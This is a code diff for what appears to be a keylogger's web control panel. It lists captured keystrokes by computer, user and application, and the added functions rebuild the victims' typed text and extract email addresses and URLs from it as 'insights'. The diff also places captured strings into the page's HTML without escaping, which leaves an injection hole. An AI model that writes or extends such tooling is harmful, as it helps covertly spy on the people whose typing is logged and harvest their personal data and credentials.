@@ -168,6 +168,32 @@ function fetchUserDetails(computerName, userName) {
         });
 }
 
+function extractFullText(userData) {
+    const ignoredKeys = new Set(["space", "backspace", "ctrl_l", "shift", "shift_r", "tab", "enter", "alt_l", "delete", "esc", "media_next", "media_play_pause", "media_previous", "null", "caps_lock", "alt_gr", "cmd", ""]);
+    let fullText = "";
+
+    for (let app in userData) {
+        for (let [timestamp, keys] of Object.entries(userData[app])) {
+            if (!Array.isArray(keys)) continue; // ✅ Skip invalid or empty logs
+
+            let filteredKeys = keys.filter(key => key && !ignoredKeys.has(key.toLowerCase())); // ✅ Check if key is valid
+            fullText += filteredKeys.join("") + " "; // ✅ Rebuild words properly
+        }
+    }
+    return fullText.trim();
+}
+
+
+function extractEmailsAndUrls(text) {
+    let emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    let urlRegex = /\b(https?:\/\/|www\.)[^\s]+/g;
+
+    let emails = text.match(emailRegex) || [];
+    let urls = text.match(urlRegex) || [];
+
+    return { emails, urls };
+}
+
 function generateLogTable(logs) {
     let tableHtml = `
         <table class="table table-striped">
@@ -195,23 +221,37 @@ function generateLogTable(logs) {
 
 function displayUserDetails(computerName, userName, userData) {
     let logsContainer = document.getElementById("logs-container");
+    let insightsContainer = document.getElementById("insights-container"); 
+
     logsContainer.innerHTML = `<h4>${computerName} - ${userName}</h4>`;
+    insightsContainer.innerHTML = "<h5>🔍 Extracted Insights</h5>";
+
+    let fullText = extractFullText(userData);
+    let { emails, urls } = extractEmailsAndUrls(fullText);
+
+    if (emails.length > 0) {
+        insightsContainer.innerHTML += `<p><strong>📧 Emails Found:</strong></p>
+            <div>${emails.map(email => `<span class="badge text-bg-primary me-2">${email}</span>`).join("")}</div>`;
+    }
+    if (urls.length > 0) {
+        insightsContainer.innerHTML += `<p><strong>🌐 URLs Found:</strong></p>
+            <div>${urls.map(url => `<span class="badge text-bg-success me-2">${url}</span>`).join("")}</div>`;
+    }
+    if (emails.length === 0 && urls.length === 0) {
+        insightsContainer.innerHTML += `<p class="text-muted">No emails or URLs found.</p>`;
+    }
 
     for (let app in userData) {
         let appId = `log-${computerName}-${userName}-${app.replace(/\s+/g, '-')}`;
 
-        let totalKeys = Object.values(userData[app]).reduce((sum, keys) => sum + keys.length, 0); // ✅ Count total keys
+        let totalKeys = Object.values(userData[app]).reduce((sum, keys) => sum + keys.length, 0);
 
         logsContainer.innerHTML += `
             <div class="card mb-2 p-2">
                 <h6>${app}</h6>
-                <p class="text-muted small">${totalKeys} keys recorded</p> <!-- ✅ Muted key count -->
-                <button class="btn btn-sm btn-secondary" onclick="toggleLogs('${appId}')">
-                    Show Logs
-                </button>
-                <div id="${appId}" class="collapse">
-                    ${generateLogTable(userData[app])}
-                </div>
+                <p class="text-muted small">${totalKeys} keys recorded</p>
+                <button class="btn btn-sm btn-secondary" onclick="toggleLogs('${appId}')">Show Logs</button>
+                <div id="${appId}" class="collapse">${generateLogTable(userData[app])}</div>
             </div>`;
     }
 }
